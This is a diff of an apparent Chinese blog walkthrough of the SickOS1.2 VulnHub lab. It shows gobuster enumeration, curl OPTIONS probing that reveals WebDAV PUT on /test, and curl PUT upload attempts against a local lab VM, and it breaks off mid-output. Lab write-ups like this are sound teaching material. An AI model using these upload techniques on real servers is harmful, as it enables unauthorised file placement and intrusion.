-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.168.56.136 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                   <br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.56.136<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Timeout:                 10s<br>===============================================================<br>2023/04/20 08:19:00 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/test                 (Status: 301) [Size: 0] [--&gt; http://192.168.56.136/test/]<br>/%7Echeckout%7E       (Status: 403) [Size: 345]<br>Progress: 220251 / 220561 (99.86%)<br>===============================================================<br>2023/04/20 08:19:59 Finished<br>===============================================================<br></code></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─$ <span class="token function">sudo</span> gobuster <span class="token function">dir</span> -u http://192.168.56.136 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                   
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+Gobuster v3.5
+by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://192.168.56.136
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 10
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   404
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.5
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+2023/04/20 08:19:00 Starting gobuster <span class="token keyword">in</span> directory enumeration mode
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+/test                 <span class="token punctuation">(</span>Status: 301<span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: 0<span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.136/test/<span class="token punctuation">]</span>
+/%7Echeckout%7E       <span class="token punctuation">(</span>Status: 403<span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: 345<span class="token punctuation">]</span>
+Progress: 220251 / 220561 <span class="token punctuation">(</span>99.86%<span class="token punctuation">)</span>
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+2023/04/20 08:19:59 Finished
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>无敌了，啥也没有。只有个<code>/test</code>以及根目录<code>/</code>。（<del>checkou</del>也没东西，别看了）</p>
 <p>想办法从这两个目录下手吧。</p>
 <p>bing搜了一下还有什么别的信息收集方法，发现个基于OWSAP的<a target="_blank" rel="noopener" href="https://github.com/OWASP/www-project-web-security-testing-guide/blob/master/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.md">web安全测试手册</a>里面提到了验证网页支持的所有HTTP方法。除了常见的<code>POST</code>和<code>GET</code>方法，如果我们能使用<code>PUT</code>，将能实现任意文件上传。我们可以在请求中使用<code>OPTIONS</code>方法查看页面支持的HTTP方法。</p>
 <p>curl的实现：<code>curl -X OPTIONS &lt;ip&gt;</code>, <code>-X</code>指定HTTP方法。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo curl -v -X OPTIONS 192.168.56.136<br>*   Trying 192.168.56.136:80...<br>* Connected to 192.168.56.136 (192.168.56.136) port 80 (<span class="hljs-comment">#0)</span><br>&gt; OPTIONS / HTTP/1.1<br>&gt; Host: 192.168.56.136<br>&gt; User-Agent: curl/7.87.0<br>&gt; Accept: */*<br>&gt; <br>* Mark bundle as not supporting multiuse<br>&lt; HTTP/1.1 200 OK<br>&lt; X-Powered-By: PHP/5.3.10-1ubuntu3.21<br>&lt; Content-<span class="hljs-built_in">type</span>: text/html<br>&lt; Transfer-Encoding: chunked<br>&lt; Date: Wed, 19 Apr 2023 16:43:58 GMT<br>&lt; Server: lighttpd/1.4.28<br>&lt; <br>&lt;html&gt;<br><br>&lt;img src=<span class="hljs-string">&quot;blow.jpg&quot;</span>&gt;<br><br>&lt;/html&gt;<br><br>&lt;!-- NOTHING IN HERE ///\\\ --&gt;&gt;&gt;&gt;<br>* Connection <span class="hljs-comment">#0 to host 192.168.56.136 left intact</span><br></code></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─$ <span class="token function">sudo</span> curl -v -X OPTIONS 192.168.56.136
+*   Trying 192.168.56.136:80<span class="token punctuation">..</span>.
+* Connected to 192.168.56.136 <span class="token punctuation">(</span>192.168.56.136<span class="token punctuation">)</span> port 80 <span class="token punctuation">(</span><span class="token comment" spellcheck="true">#0)</span>
+<span class="token operator">></span> OPTIONS / HTTP/1.1
+<span class="token operator">></span> Host: 192.168.56.136
+<span class="token operator">></span> User-Agent: curl/7.87.0
+<span class="token operator">></span> Accept: */*
+<span class="token operator">></span> 
+* Mark bundle as not supporting multiuse
+<span class="token operator">&lt;</span> HTTP/1.1 200 OK
+<span class="token operator">&lt;</span> X-Powered-By: PHP/5.3.10-1ubuntu3.21
+<span class="token operator">&lt;</span> Content-type: text/html
+<span class="token operator">&lt;</span> Transfer-Encoding: chunked
+<span class="token operator">&lt;</span> Date: Wed, 19 Apr 2023 16:43:58 GMT
+<span class="token operator">&lt;</span> Server: lighttpd/1.4.28
+<span class="token operator">&lt;</span> 
+<span class="token operator">&lt;</span>html<span class="token operator">></span>
 
+<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"blow.jpg"</span><span class="token operator">></span>
+
+<span class="token operator">&lt;</span>/html<span class="token operator">></span>
+
+<span class="token operator">&lt;</span><span class="token operator">!</span>-- NOTHING IN HERE ///\\\ --<span class="token operator">>></span><span class="token operator">>></span>
+* Connection <span class="token comment" spellcheck="true">#0 to host 192.168.56.136 left intact</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>可以看到根目录下不支持什么别的方法。</p>
 <p>看看<code>/test</code>的:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo curl -v -X OPTIONS 192.168.56.136/test<br>*   Trying 192.168.56.136:80...<br>* Connected to 192.168.56.136 (192.168.56.136) port 80 (<span class="hljs-comment">#0)</span><br>&gt; OPTIONS /test HTTP/1.1<br>&gt; Host: 192.168.56.136<br>&gt; User-Agent: curl/7.87.0<br>&gt; Accept: */*<br>&gt; <br>* Mark bundle as not supporting multiuse<br>&lt; HTTP/1.1 301 Moved Permanently<br>&lt; DAV: 1,2<br>&lt; MS-Author-Via: DAV<br>&lt; Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK<br>&lt; Location: http://192.168.56.136/test/<br>&lt; Content-Length: 0<br>&lt; Date: Wed, 19 Apr 2023 16:50:42 GMT<br>&lt; Server: lighttpd/1.4.28<br>&lt; <br>* Connection <span class="hljs-comment">#0 to host 192.168.56.136 left intact</span><br></code></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─$ <span class="token function">sudo</span> curl -v -X OPTIONS 192.168.56.136/test
+*   Trying 192.168.56.136:80<span class="token punctuation">..</span>.
+* Connected to 192.168.56.136 <span class="token punctuation">(</span>192.168.56.136<span class="token punctuation">)</span> port 80 <span class="token punctuation">(</span><span class="token comment" spellcheck="true">#0)</span>
+<span class="token operator">></span> OPTIONS /test HTTP/1.1
+<span class="token operator">></span> Host: 192.168.56.136
+<span class="token operator">></span> User-Agent: curl/7.87.0
+<span class="token operator">></span> Accept: */*
+<span class="token operator">></span> 
+* Mark bundle as not supporting multiuse
+<span class="token operator">&lt;</span> HTTP/1.1 301 Moved Permanently
+<span class="token operator">&lt;</span> DAV: 1,2
+<span class="token operator">&lt;</span> MS-Author-Via: DAV
+<span class="token operator">&lt;</span> Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
+<span class="token operator">&lt;</span> Location: http://192.168.56.136/test/
+<span class="token operator">&lt;</span> Content-Length: 0
+<span class="token operator">&lt;</span> Date: Wed, 19 Apr 2023 16:50:42 GMT
+<span class="token operator">&lt;</span> Server: lighttpd/1.4.28
+<span class="token operator">&lt;</span> 
+* Connection <span class="token comment" spellcheck="true">#0 to host 192.168.56.136 left intact</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>我们发现&#x2F;test目录下支持<code>PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK</code>等多种方法。其中也有我们最想要的<code>PUT</code>。</p>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>传一下</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~/vulnhub/SickOS1.2/workSpace]<br>└─$ sudo curl 192.168.56.136/test -v --upload-file test.html<br><span class="hljs-meta prompt_">  % </span><span class="language-bash">Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br>                                 Dload  Upload   Total   Spent    Left  Speed<br>  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 192.168.56.136:80...<br>* Connected to 192.168.56.136 (192.168.56.136) port 80 (#0)<br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">PUT /test HTTP/1.1</span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">Host: 192.168.56.136</span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">User-Agent: curl/7.87.0</span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">Accept: */*</span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">Content-Length: 38</span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">Expect: 100-<span class="hljs-built_in">continue</span></span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash"></span><br><span class="language-bash">* Mark bundle as not supporting multiuse</span><br>&lt; HTTP/1.1 417 Expectation Failed<br>&lt; Content-Type: text/html<br>&lt; Content-Length: 363<br>&lt; Connection: close<br>&lt; Date: Wed, 19 Apr 2023 17:14:59 GMT<br>&lt; Server: lighttpd/1.4.28<br>&lt; <br>&#123; [363 bytes data]<br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;<br>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;<br>         &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;<br>&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; xml:lang=&quot;en&quot; lang=&quot;en&quot;&gt;<br> &lt;head&gt;<br>  &lt;title&gt;417 - Expectation Failed&lt;/title&gt;<br> &lt;/head&gt;<br> &lt;body&gt;<br>  &lt;h1&gt;417 - Expectation Failed&lt;/h1&gt;<br> &lt;/body&gt;<br>&lt;/html&gt;<br> 90   401  100   363    0     0   154k      0 --:--:-- --:--:-- --:--:--  177k<br>* Closing connection 0<br></code></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-shell"><code class="language-shell">┌──(kali㉿kali)-[~/vulnhub/SickOS1.2/workSpace]
+└─$ sudo curl 192.168.56.136/test -v --upload-file test.html
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 192.168.56.136:80...
+* Connected to 192.168.56.136 (192.168.56.136) port 80 (#0)
+> PUT /test HTTP/1.1
+> Host: 192.168.56.136
+> User-Agent: curl/7.87.0
+> Accept: */*
+> Content-Length: 38
+> Expect: 100-continue
+> 
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 417 Expectation Failed
+< Content-Type: text/html
+< Content-Length: 363
+< Connection: close
+< Date: Wed, 19 Apr 2023 17:14:59 GMT
+< Server: lighttpd/1.4.28
+< 
+&#123; [363 bytes data]
+<?xml version="1.0" encoding="iso-8859-1"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+ <head>
+  <title>417 - Expectation Failed</title>
+ </head>
+ <body>
+  <h1>417 - Expectation Failed</h1>
+ </body>
+</html>
+ 90   401  100   363    0     0   154k      0 --:--:-- --:--:-- --:--:--  177k
+* Closing connection 0
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>报<code>417</code>，啥情况，查一下，发现是服务器端<code>Expectation</code>的问题。默认的是<code>Expect: 100-continue</code>。</p>
 <p>所以我们在Header里面将<code>Expect</code>设置为空即可。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/SickOS1.2/workSpace]<br>└─$ sudo curl 192.168.56.136/test -T test.html -H <span class="hljs-string">&quot;Expect:&quot;</span> -v<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br>                                 Dload  Upload   Total   Spent    Left  Speed<br>  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 192.168.56.136:80...<br>* Connected to 192.168.56.136 (192.168.56.136) port 80 (<span class="hljs-comment">#0)</span><br>&gt; PUT /test HTTP/1.1<br>&gt; Host: 192.168.56.136<br>&gt; User-Agent: curl/7.87.0<br>&gt; Accept: */*<br>&gt; Content-Length: 38<br>&gt; <br>&#125; [38 bytes data]<br>* We are completely uploaded and fine<br>* Mark bundle as not supporting multiuse<br>&lt; HTTP/1.1 403 Forbidden<br>&lt; Content-Type: text/html<br>&lt; Content-Length: 345<br>&lt; Date: Wed, 19 Apr 2023 17:42:29 GMT<br>&lt; Server: lighttpd/1.4.28<br>&lt; <br>&#123; [345 bytes data]<br>&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;iso-8859-1&quot;</span>?&gt;<br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span><br>         <span class="hljs-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;<br>&lt;html xmlns=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span> xml:lang=<span class="hljs-string">&quot;en&quot;</span> lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br> &lt;<span class="hljs-built_in">head</span>&gt;<br>  &lt;title&gt;403 - Forbidden&lt;/title&gt;<br> &lt;/head&gt;<br> &lt;body&gt;<br>  &lt;h1&gt;403 - Forbidden&lt;/h1&gt;<br> &lt;/body&gt;<br>&lt;/html&gt;<br>100   383  100   345  100    38   126k  14323 --:--:-- --:--:-- --:--:--  187k<br>* Connection <span class="hljs-comment">#0 to host 192.168.56.136 left intact</span><br></code></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/SickOS1.2/workSpace<span class="token punctuation">]</span>
+└─$ <span class="token function">sudo</span> curl 192.168.56.136/test -T test.html -H <span class="token string">"Expect:"</span> -v
+<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> kali: 
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 192.168.56.136:80<span class="token punctuation">..</span>.
+* Connected to 192.168.56.136 <span class="token punctuation">(</span>192.168.56.136<span class="token punctuation">)</span> port 80 <span class="token punctuation">(</span><span class="token comment" spellcheck="true">#0)</span>
+<span class="token operator">></span> PUT /test HTTP/1.1
+<span class="token operator">></span> Host: 192.168.56.136
+<span class="token operator">></span> User-Agent: curl/7.87.0
+<span class="token operator">></span> Accept: */*
+<span class="token operator">></span> Content-Length: 38
+<span class="token operator">></span> 
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; [38 bytes data]</span>
+* We are completely uploaded and fine
+* Mark bundle as not supporting multiuse
+<span class="token operator">&lt;</span> HTTP/1.1 403 Forbidden
+<span class="token operator">&lt;</span> Content-Type: text/html
+<span class="token operator">&lt;</span> Content-Length: 345
+<span class="token operator">&lt;</span> Date: Wed, 19 Apr 2023 17:42:29 GMT
+<span class="token operator">&lt;</span> Server: lighttpd/1.4.28
+<span class="token operator">&lt;</span> 
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123; [345 bytes data]</span>
+<span class="token operator">&lt;</span>?xml version<span class="token operator">=</span><span class="token string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string">"iso-8859-1"</span>?<span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html PUBLIC <span class="token string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span>
+         <span class="token string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>html xmlns<span class="token operator">=</span><span class="token string">"http://www.w3.org/1999/xhtml"</span> xml:lang<span class="token operator">=</span><span class="token string">"en"</span> lang<span class="token operator">=</span><span class="token string">"en"</span><span class="token operator">></span>
+ <span class="token operator">&lt;</span>head<span class="token operator">></span>
+  <span class="token operator">&lt;</span>title<span class="token operator">></span>403 - Forbidden<span class="token operator">&lt;</span>/title<span class="token operator">></span>
+ <span class="token operator">&lt;</span>/head<span class="token operator">></span>
+ <span class="token operator">&lt;</span>body<span class="token operator">></span>
+  <span class="token operator">&lt;</span>h1<span class="token operator">></span>403 - Forbidden<span class="token operator">&lt;</span>/h1<span class="token operator">></span>
+ <span class="token operator">&lt;</span>/body<span class="token operator">></span>
+<span class="token operator">&lt;</span>/html<span class="token operator">></span>
+100   383  100   345  100    38   126k  14323 --:--:-- --:--:-- --:--:--  187k
+* Connection <span class="token comment" spellcheck="true">#0 to host 192.168.56.136 left intact</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>报<code>403</code>没想到的，哪里出问题了，奇了怪了。</p>
 <p>测试一下<code>PUT</code>方法</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/SickOS1.2/workSpace]<br>└─$ sudo curl 192.168.56.136/test -X PUT -v                   <br>*   Trying 192.168.56.136:80...<br>* Connected to 192.168.56.136 (192.168.56.136) port 80 (<span class="hljs-comment">#0)</span><br>&gt; PUT /test HTTP/1.1<br>&gt; Host: 192.168.56.136<br>&gt; User-Agent: curl/7.87.0<br>&gt; Accept: */*<br>&gt; <br>* Mark bundle as not supporting multiuse<br>&lt; HTTP/1.1 201 Created<br>&lt; Content-Length: 0<br>&lt; Date: Wed, 19 Apr 2023 17:43:48 GMT<br>&lt; Server: lighttpd/1.4.28<br>&lt; <br>* Connection <span class="hljs-comment">#0 to host 192.168.56.136 left intact</span><br></code></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/SickOS1.2/workSpace<span class="token punctuation">]</span>
+└─$ <span class="token function">sudo</span> curl 192.168.56.136/test -X PUT -v                   
+*   Trying 192.168.56.136:80<span class="token punctuation">..</span>.
+* Connected to 192.168.56.136 <span class="token punctuation">(</span>192.168.56.136<span class="token punctuation">)</span> port 80 <span class="token punctuation">(</span><span class="token comment" spellcheck="true">#0)</span>
+<span class="token operator">></span> PUT /test HTTP/1.1
+<span class="token operator">></span> Host: 192.168.56.136
+<span class="token operator">></span> User-Agent: curl/7.87.0
